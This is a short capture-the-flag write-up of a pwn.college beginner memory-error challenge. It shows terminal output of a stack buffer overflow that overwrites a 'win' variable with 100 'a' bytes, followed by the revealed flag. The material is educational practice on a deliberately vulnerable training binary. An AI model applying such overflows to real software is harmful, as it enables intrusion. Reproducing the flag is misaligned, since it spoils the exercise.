# Level 1.0

Right so here, I read this statement when I opened this challenge

`The buffer is 86 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.`

Simply put I just have to send an input larger than 86 bytes and this will overflow the buffer. Pretty much like OASIS'S A Rocky Start Challenge

```
hacker@memory-errors~level1-0:/challenge$ ./baby*
###
### Welcome to ./babymem-level-1-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd5dbd5c60 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffd5dbd5c68 (rsp+0x0008) | 58 6e bd 5d fd 7f 00 00 | 0x00007ffd5dbd6e58 |
| 0x00007ffd5dbd5c70 (rsp+0x0010) | 48 6e bd 5d fd 7f 00 00 | 0x00007ffd5dbd6e48 |
| 0x00007ffd5dbd5c78 (rsp+0x0018) | 23 67 a2 ae 01 00 00 00 | 0x00000001aea26723 |
| 0x00007ffd5dbd5c80 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffd5dbd5c88 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5c90 (rsp+0x0030) | a0 5c bd 5d fd 7f 00 00 | 0x00007ffd5dbd5ca0 |
| 0x00007ffd5dbd5c98 (rsp+0x0038) | f8 5c bd 5d fd 7f 00 00 | 0x00007ffd5dbd5cf8 |
| 0x00007ffd5dbd5ca0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5ca8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5cb0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5cb8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5cc0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5cc8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5cd0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5cd8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5ce0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5ce8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5cf0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd5dbd5cf8 (rsp+0x0098) | 00 00 00 00 11 60 00 00 | 0x0000601100000000 |
| 0x00007ffd5dbd5d00 (rsp+0x00a0) | 50 6d bd 5d fd 7f 00 00 | 0x00007ffd5dbd6d50 |
| 0x00007ffd5dbd5d08 (rsp+0x00a8) | 00 06 04 cc f4 58 3b 6b | 0x6b3b58f4cc040600 |
| 0x00007ffd5dbd5d10 (rsp+0x00b0) | 50 6d bd 5d fd 7f 00 00 | 0x00007ffd5dbd6d50 |
| 0x00007ffd5dbd5d18 (rsp+0x00b8) | 1b 32 da 17 11 60 00 00 | 0x0000601117da321b |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffd5dbd5c60, and our base pointer points to 0x7ffd5dbd5d10.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7ffd5dbd5ca0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 86 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7ffd5dbd5cf8, 88 bytes after the start of your input buffer.

Payload size: 100
You have chosen to send 100 bytes of input!
This will allow you to write from 0x7ffd5dbd5ca0 (the start of the input buffer)
right up to (but not including) 0x7ffd5dbd5d04 (which is 14 bytes beyond the end of the buffer).
Send your payload (up to 100 bytes)!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
You sent 100 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd5dbd5c60 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffd5dbd5c68 (rsp+0x0008) | 58 6e bd 5d fd 7f 00 00 | 0x00007ffd5dbd6e58 |
| 0x00007ffd5dbd5c70 (rsp+0x0010) | 48 6e bd 5d fd 7f 00 00 | 0x00007ffd5dbd6e48 |
| 0x00007ffd5dbd5c78 (rsp+0x0018) | 23 67 a2 ae 01 00 00 00 | 0x00000001aea26723 |
| 0x00007ffd5dbd5c80 (rsp+0x0020) | 68 0d 00 00 64 00 00 00 | 0x0000006400000d68 |
| 0x00007ffd5dbd5c88 (rsp+0x0028) | 64 00 00 00 00 00 00 00 | 0x0000000000000064 |
| 0x00007ffd5dbd5c90 (rsp+0x0030) | a0 5c bd 5d fd 7f 00 00 | 0x00007ffd5dbd5ca0 |
| 0x00007ffd5dbd5c98 (rsp+0x0038) | f8 5c bd 5d fd 7f 00 00 | 0x00007ffd5dbd5cf8 |
| 0x00007ffd5dbd5ca0 (rsp+0x0040) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5ca8 (rsp+0x0048) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5cb0 (rsp+0x0050) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5cb8 (rsp+0x0058) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5cc0 (rsp+0x0060) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5cc8 (rsp+0x0068) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5cd0 (rsp+0x0070) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5cd8 (rsp+0x0078) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5ce0 (rsp+0x0080) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5ce8 (rsp+0x0088) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5cf0 (rsp+0x0090) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5cf8 (rsp+0x0098) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffd5dbd5d00 (rsp+0x00a0) | 61 61 61 61 fd 7f 00 00 | 0x00007ffd61616161 |
| 0x00007ffd5dbd5d08 (rsp+0x00a8) | 00 06 04 cc f4 58 3b 6b | 0x6b3b58f4cc040600 |
| 0x00007ffd5dbd5d10 (rsp+0x00b0) | 50 6d bd 5d fd 7f 00 00 | 0x00007ffd5dbd6d50 |
| 0x00007ffd5dbd5d18 (rsp+0x00b8) | 1b 32 da 17 11 60 00 00 | 0x0000601117da321b |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffd5dbd5ca0
- the saved frame pointer (of main) is at 0x7ffd5dbd5d10
- the saved return address (previously to main) is at 0x7ffd5dbd5d18
- the saved return address is now pointing to 0x601117da321b.
- the canary is stored at 0x7ffd5dbd5d08.
- the canary value is now 0x6b3b58f4cc040600.
- the address of the win variable is 0x7ffd5dbd5cf8.
- the value of the win variable is 0x61616161.

You win! Here is your flag:
pwn.college{Y_ixHlgGRtI1utkgzUB9eswOjG6.0VO4IDLzITO0czW}
```

## Flag
`pwn.college{Y_ixHlgGRtI1utkgzUB9eswOjG6.0VO4IDLzITO0czW}`